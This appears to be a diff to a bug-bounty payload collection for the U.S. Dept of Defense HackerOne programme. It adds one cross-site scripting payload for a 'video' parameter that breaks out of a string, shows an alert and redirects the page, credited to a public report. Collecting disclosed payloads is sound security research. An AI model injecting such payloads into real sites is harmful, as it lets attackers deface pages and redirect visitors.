@@ -1,6 +1,6 @@
 # U.S. Dept Of Defense
 
-217 payloads.
+218 payloads.
 
 ### `a1bb52f5`
 
@@ -1976,6 +1976,17 @@ Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, lik
 
 **Parameter:** `query`
 — [XSS found for https://█████████](https://hackerone.com/reports/2670521) · U.S. Dept Of Defense · [thpless](https://hackerone.com/thpless)
+
+### `12e32880`
+
+```
+video");
+alert('Hacked by k0x');
+setTimeout(()=>location.href='████',5000);//
+```
+
+**Parameter:** `video`
+— [CSRF to XSS](https://hackerone.com/reports/2736979) · U.S. Dept Of Defense · [k0x](https://hackerone.com/k0x)
 
 ### `1cb86b89`
 
